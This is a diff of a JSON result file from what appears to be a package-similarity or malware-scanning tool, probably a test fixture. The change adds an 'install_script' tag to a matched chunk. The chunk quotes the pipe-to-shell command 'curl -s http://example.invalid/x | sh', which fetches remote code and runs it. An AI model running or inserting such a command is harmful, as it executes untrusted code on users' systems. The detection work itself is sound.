@@ -2,11 +2,11 @@
   "package": "package.json",
   "version": "",
   "score": 1.0000,
-  "seconds": 0.0040,
+  "seconds": 0.0095,
   "matched_packages": [
     { "package": "code_a.js", "group": "code_a.js", "ncd": 1.0000, "chunks": 1 }
   ],
   "chunks": [
-    { "file": "package.json", "start": 0, "ncd": 1.0000, "match": { "file": "code_a.js", "package": "code_a.js", "start": 0 }, "text": "curl -s http://example.invalid/x | sh\n" }
+    { "file": "package.json", "kind": "install_script", "start": 0, "ncd": 1.0000, "match": { "file": "code_a.js", "package": "code_a.js", "start": 0 }, "text": "curl -s http://example.invalid/x | sh\n" }
   ]
 }
